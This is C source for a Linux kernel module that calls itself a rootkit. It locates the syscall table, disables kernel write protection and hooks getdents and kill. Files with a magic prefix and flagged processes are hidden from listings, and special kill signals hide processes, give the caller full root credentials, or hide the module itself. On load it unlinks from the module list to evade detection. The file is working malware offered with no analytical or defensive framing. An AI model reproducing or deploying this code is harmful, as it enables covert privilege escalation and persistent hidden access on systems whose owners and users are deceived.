#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <asm/uaccess.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include "rootkit.h"

unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

unsigned long * getting_syscalltable(void)
{
	unsigned long *syscalltable;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscalltable = (unsigned long *)i;

		if (syscalltable[__NR_close] == (unsigned long)sys_close)
			return syscalltable;
	}
	return NULL;
}

struct task_struct * find_task(pid_t pid)
{
	struct task_struct *process = current;
	for_each_process(process) {
		if (process->pid == pid)
			return process;
	}
	return NULL;
}

int is_hidden(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}


asmlinkage int changedgetdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;


d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;


	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_hidden(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void give_root(void)
{
	
	struct cred *newcreds;
	newcreds = prepare_creds();
	if (newcreds == NULL)
		return;
	
	newcreds->uid.val = newcreds->gid.val = 0;
	newcreds->euid.val = newcreds->egid.val = 0;
	newcreds->suid.val = newcreds->sgid.val = 0;
	newcreds->fsuid.val = newcreds->fsgid.val = 0;
	
	commit_creds(newcreds);
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static int module_hidden = 0;

static struct list_head *prvModule;

void module_show(void)
{
	list_add(&THIS_MODULE->list, prvModule);
	module_hidden = 0;
}

void module_hide(void)
{
	prvModule = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

asmlinkage int kill_method(pid_t pid, int signal)
{
	struct task_struct *task;

	switch (signal) {
		case HIDE:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case ROOT:
			give_root();
			break;
		case HIDEMOD:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, signal);
	}
	return 0;
}

static inline void protect_memory(void)
{
	write_cr0(cr0);
}

static inline void unprotect_memory(void)
{
	write_cr0(cr0 & ~0x00010000);
}

static int __init rootkit_init(void)
{
	__sys_call_table = getting_syscalltable();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)changedgetdents;
	__sys_call_table[__NR_kill] = (unsigned long)kill_method;
	protect_memory();

	return 0;
}

static void __exit removerootkit(void)
{
	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(rootkit_init);
module_exit(removerootkit);

